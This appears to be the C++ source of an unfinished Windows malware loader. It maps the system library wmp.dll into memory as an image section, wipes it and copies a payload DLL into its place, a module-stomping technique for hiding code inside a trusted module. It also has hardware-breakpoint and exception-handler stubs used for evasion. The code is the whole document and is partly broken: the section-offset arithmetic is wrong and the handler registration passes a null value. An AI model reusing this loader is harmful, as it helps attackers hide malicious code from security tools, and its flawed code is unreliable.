#include<Windows.h>
#include<winternl.h>
#include<winnt.h>

typedef NTSTATUS (NTAPI* fnNtOpenSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS (NTAPI* fnNtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS (NTAPI* fnNtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef PIMAGE_NT_HEADERS (NTAPI* fnRtlImageNtHeader)(PVOID Base);

HMODULE hNtdll = nullptr;

fnNtOpenSection NtOpenSection = nullptr;
fnNtCreateSection NtCreateSection = nullptr;
fnNtMapViewOfSection NtMapViewOfSection = nullptr;
fnRtlImageNtHeader RtlImageNtHeader = nullptr;

VOID InitWinAPI() {
	NtOpenSection = (fnNtOpenSection)GetProcAddress(hNtdll, "NtOpenSection");
	NtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	RtlImageNtHeader = (fnRtlImageNtHeader)GetProcAddress(hNtdll, "RtlImageNtHeader");
}


BOOL SetHardwareBreakpoint(PVOID address, PCONTEXT ctx) {
	if (ctx) {
		ctx->Dr0 = (DWORD64)address;
		ctx->Dr7 = 1;
		ctx->Dr6 = 0;
		return TRUE;
	}
	else {
		CONTEXT context = { 0 };
		context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		HANDLE hThread = GetCurrentThread();
		if (!GetThreadContext(hThread, &context)) return FALSE;

		context.Dr0 = (DWORD64)address;
		context.Dr7 = 1;

		return SetThreadContext(hThread, &context);
	}
}

BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		PCONTEXT ctx = ExceptionInfo->ContextRecord;
	}
	return FALSE;
}

BOOL MovePayloadToMemory(PVOID pDest, BYTE* pPayloadData, DWORD dwPayloadSize) {
	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pPayloadData);
	memcpy(pDest, pPayloadData, pNt->OptionalHeader.SizeOfHeaders);
	
	for (size_t i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD64)pPayloadData + sizeof(IMAGE_NT_HEADERS) + (DWORD64)pNt + (i * sizeof(IMAGE_SECTION_HEADER)));
		PVOID pSectionDest = (PVOID)((DWORD64)pDest + pSectionHeader->VirtualAddress);
		PVOID pSectionSrc = (PVOID)((DWORD64)pPayloadData + pSectionHeader->PointerToRawData);
		memcpy(pSectionDest, pSectionSrc, pSectionHeader->SizeOfRawData);
	}

	return TRUE;
}



int main() {
	hNtdll = GetModuleHandleA("ntdll.dll");

	char pPayload[] = "C:\\Users\\Anakin\\source\\repos\\VEHHack\\x64\\Debug\\Payload.dll";
	HANDLE hPayloadHandle = CreateFileA(pPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwPayloadSize = GetFileSize(hPayloadHandle, NULL);
	BYTE* pPlayloadData = new BYTE[dwPayloadSize + 1];
	memset(pPlayloadData, 0, dwPayloadSize + 1);
	ReadFile(hPayloadHandle, pPlayloadData, dwPayloadSize, nullptr, nullptr);
	CloseHandle(hPayloadHandle);

	char pWmpPath[] = "C:\\Windows\\System32\\wmp.dll";
	HANDLE hWmpHandle = CreateFileA(pWmpPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	HANDLE hSection = nullptr;
	NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hWmpHandle);
	CloseHandle(hWmpHandle);

	PVOID pBaseAddress = nullptr;
	SIZE_T ViewSize = 0;
	
	NtMapViewOfSection(hSection, GetCurrentProcess(), &pBaseAddress, 0, 0, NULL, &ViewSize, 2, 0, PAGE_READWRITE);

	
	PIMAGE_NT_HEADERS pWmpNtHeader = RtlImageNtHeader(pBaseAddress);
	//clear wmp.dll's memory
	DWORD dwImageSize = pWmpNtHeader->OptionalHeader.SizeOfImage;
	memset(pBaseAddress, 0, dwImageSize);
	//Read payload to the wmp.dll's memory
	MovePayloadToMemory(pBaseAddress, pPlayloadData, dwPayloadSize);
	

	HANDLE VectoredHandler = nullptr;
	AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VectoredHandler);

}